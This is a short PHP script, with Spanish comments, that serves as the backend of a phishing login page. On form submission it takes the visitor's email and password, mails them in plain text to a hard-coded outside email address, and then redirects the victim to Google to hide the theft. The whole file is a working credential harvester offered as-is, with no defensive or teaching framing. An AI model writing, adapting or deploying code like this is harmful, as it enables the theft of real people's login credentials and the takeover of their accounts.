<?php
// Verificar si se ha enviado el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Obtener los datos del formulario
  $email = $_POST['email'];
  $password = $_POST['password'];

  // Enviar el correo electrónico
  $to ="steven.montoya19@unach.mx";
  $subject = "Nuevo Inicio de Sesion";
  $message = "Correo electronico: $email\nContraseña: $password";
  mail($to, $subject, $message);

  // Redirigir al usuario a Google
  header("Location: https://www.google.com");
  exit();
}
?>
